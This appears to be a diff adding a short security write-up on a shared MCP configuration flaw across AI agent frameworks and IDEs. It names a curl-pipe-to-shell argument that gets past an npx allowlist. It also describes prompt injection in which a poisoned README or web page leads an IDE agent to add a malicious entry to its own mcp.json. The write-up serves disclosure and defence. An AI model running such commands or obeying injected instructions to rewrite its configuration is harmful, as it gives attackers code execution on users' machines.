@@ -1,0 +1,11 @@
+Four Families, One Root Cause.
+
+The same underlying pattern manifests in four distinct exploitation classes, each targeting a different layer of the stack. What makes this a supply chain event rather than a single CVE is that none of these vendors wrote the bug, they inherited the default.
+
+Web dashboards in Agent Zero, Langchain-Chatchat, Jaaz, and others accept an MCP config via an unauthenticated form. The command string is saved, executed on first connect, and runs under the framework's identity.
+
+Platforms that attempted a defense, e.g. Flowise's allowlist of npx/uvx, get bypassed with hostile arguments. npx -c "curl … | sh" is still npx. The allowlist guards the binary name; argv is unrestricted.
+
+In AI IDEs (Windsurf, Cursor), the agent can write to its own mcp.json. A poisoned README, web page, or file opened in the editor injects a prompt that tells the agent to append a malicious STDIO entry. Next reload → local RCE.
+
+OX submitted a benign proof-of-concept to 11 public MCP registries; 9 accepted it. MCP servers ship as text blobs carrying a command, closer to an install script than a package. No sandbox, no capability model, no signature baseline.
